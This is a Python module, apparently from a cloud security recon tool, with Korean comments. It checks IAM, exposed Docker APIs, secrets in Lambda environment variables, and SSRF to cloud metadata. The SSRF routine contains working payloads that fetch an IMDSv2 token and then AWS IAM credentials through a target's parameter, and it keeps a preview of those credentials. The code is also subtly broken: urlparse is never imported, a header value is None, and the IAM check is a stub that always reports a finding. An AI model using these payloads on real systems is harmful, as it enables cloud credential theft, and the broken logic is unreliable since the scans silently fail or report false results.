# app/core/recon/cloud_advanced.py
# 클라우드 네이티브 보안 심화

import requests
import logging
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)


class CloudNativeSecurity:
    """
    클라우드 네이티브 보안: IAM 검증, 컨테이너 탈출, Serverless, SSRF to Metadata
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
    
    def test_iam_permissions(self, target: str) -> Dict[str, Any]:
        """
        IAM 권한 검증
        
        과도한 권한 부여, AssumeRole 체인 분석
        """
        vulnerabilities = []
        
        try:
            # AWS IAM 정책 분석 (boto3 필요)
            try:
                import boto3
                from botocore.exceptions import ClientError
                
                # 현재 IAM 역할 정보 확인
                sts = boto3.client('sts')
                identity = sts.get_caller_identity()
                
                iam = boto3.client('iam')
                
                # 사용자/역할의 정책 확인
                # 실제로는 더 복잡한 분석 필요
                
                vulnerabilities.append({
                    "type": "IAM Permission Analysis",
                    "severity": "INFO",
                    "details": "IAM analysis requires detailed policy review",
                    "note": "Manual review recommended"
                })
                
            except ImportError:
                logger.warning("boto3가 설치되지 않아 IAM 테스트를 건너뜁니다")
            except Exception as e:
                logger.debug(f"IAM 테스트 실패: {e}")
                
        except Exception as e:
            logger.warning(f"IAM 권한 검증 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_container_escape(self, docker_api_url: str) -> Dict[str, Any]:
        """
        컨테이너 탈출 테스트
        
        Privileged 컨테이너, hostPath 마운트, Docker socket 노출
        """
        vulnerabilities = []
        
        try:
            # Docker API 정보 수집
            response = requests.get(
                f"{docker_api_url}/containers/json",
                timeout=self.timeout,
                verify=False,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            
            if response.status_code == 200:
                containers = response.json()
                
                for container in containers:
                    # Privileged 모드 확인
                    host_config = container.get("HostConfig", {})
                    if host_config.get("Privileged"):
                        vulnerabilities.append({
                            "type": "Privileged Container",
                            "container_id": container.get("Id", "")[:12],
                            "severity": "HIGH",
                            "details": "Container running in privileged mode"
                        })
                    
                    # hostPath 마운트 확인
                    mounts = container.get("Mounts", [])
                    for mount in mounts:
                        if mount.get("Type") == "bind" and "/" in mount.get("Source", ""):
                            vulnerabilities.append({
                                "type": "HostPath Mount",
                                "container_id": container.get("Id", "")[:12],
                                "mount_path": mount.get("Source", ""),
                                "severity": "HIGH",
                                "details": "Host filesystem mounted in container"
                            })
                    
                    # Docker socket 마운트 확인
                    for mount in mounts:
                        if "docker.sock" in mount.get("Source", ""):
                            vulnerabilities.append({
                                "type": "Docker Socket Mount",
                                "container_id": container.get("Id", "")[:12],
                                "severity": "CRITICAL",
                                "details": "Docker socket mounted - container escape possible"
                            })
                            
        except Exception as e:
            logger.warning(f"컨테이너 탈출 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_serverless(self, target: str) -> Dict[str, Any]:
        """
        Serverless 취약점 테스트
        
        Lambda 인젝션, 이벤트 인젝션, 콜드 스타트 공격
        """
        vulnerabilities = []
        
        try:
            # Serverless 엔드포인트 찾기
            # 실제로는 API Gateway, Lambda 함수 URL 등 확인 필요
            
            # Lambda 함수 정보 확인 (boto3 필요)
            try:
                import boto3
                
                lambda_client = boto3.client('lambda')
                functions = lambda_client.list_functions()
                
                for func in functions.get('Functions', []):
                    # 환경 변수에서 시크릿 확인
                    env_vars = func.get('Environment', {}).get('Variables', {})
                    for key, value in env_vars.items():
                        if any(secret in key.lower() for secret in ['secret', 'key', 'password', 'token']):
                            vulnerabilities.append({
                                "type": "Hardcoded Secrets in Lambda",
                                "function_name": func.get('FunctionName', ''),
                                "severity": "HIGH",
                                "details": f"Potential secret in environment variable: {key}"
                            })
                
            except ImportError:
                logger.warning("boto3가 설치되지 않아 Serverless 테스트를 건너뜁니다")
            except Exception as e:
                logger.debug(f"Serverless 테스트 실패: {e}")
                
        except Exception as e:
            logger.warning(f"Serverless 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_ssrf_to_metadata(
        self,
        target_url: str,
        ssrf_parameter: str
    ) -> Dict[str, Any]:
        """
        SSRF to Cloud Metadata 테스트
        
        IMDSv1/v2 차이 활용, 토큰 탈취 시도
        """
        vulnerabilities = []
        
        # 메타데이터 엔드포인트
        metadata_endpoints = {
            "aws_imdsv1": "http://169.254.169.254/latest/meta-data/",
            "aws_imdsv2": "http://169.254.169.254/latest/api/token",  # 토큰 먼저 요청
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/"
        }
        
        try:
            parsed = urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for endpoint_name, endpoint_url in metadata_endpoints.items():
                try:
                    # SSRF 페이로드로 메타데이터 엔드포인트 접근 시도
                    test_url = f"{base_url}?{ssrf_parameter}={endpoint_url}"
                    
                    response = requests.get(
                        test_url,
                        timeout=5,
                        verify=False,
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Metadata-Flavor": "Google" if "gcp" in endpoint_name else None
                        },
                        allow_redirects=False
                    )
                    
                    # 메타데이터 응답 확인
                    if response.status_code == 200:
                        # AWS 인스턴스 ID, Azure 메타데이터 등 확인
                        if "instance-id" in response.text or "ami-id" in response.text:
                            vulnerabilities.append({
                                "type": f"SSRF to Cloud Metadata ({endpoint_name})",
                                "endpoint": endpoint_url,
                                "severity": "CRITICAL",
                                "details": "Cloud metadata accessible via SSRF",
                                "response_preview": response.text[:200]
                            })
                            break
                except:
                    continue
            
            # IMDSv2 토큰 탈취 시도
            try:
                # 1단계: 토큰 요청
                token_url = f"{base_url}?{ssrf_parameter}=http://169.254.169.254/latest/api/token"
                token_response = requests.put(
                    token_url,
                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                    timeout=5,
                    verify=False
                )
                
                if token_response.status_code == 200:
                    token = token_response.text
                    
                    # 2단계: 토큰으로 메타데이터 접근
                    metadata_url = f"{base_url}?{ssrf_parameter}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    metadata_response = requests.get(
                        metadata_url,
                        headers={"X-aws-ec2-metadata-token": token},
                        timeout=5,
                        verify=False
                    )
                    
                    if metadata_response.status_code == 200:
                        vulnerabilities.append({
                            "type": "SSRF to AWS IAM Credentials (IMDSv2)",
                            "severity": "CRITICAL",
                            "details": "IAM credentials accessible via SSRF with IMDSv2 token",
                            "credentials_preview": metadata_response.text[:200]
                        })
            except:
                pass
                
        except Exception as e:
            logger.warning(f"SSRF to Metadata 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }

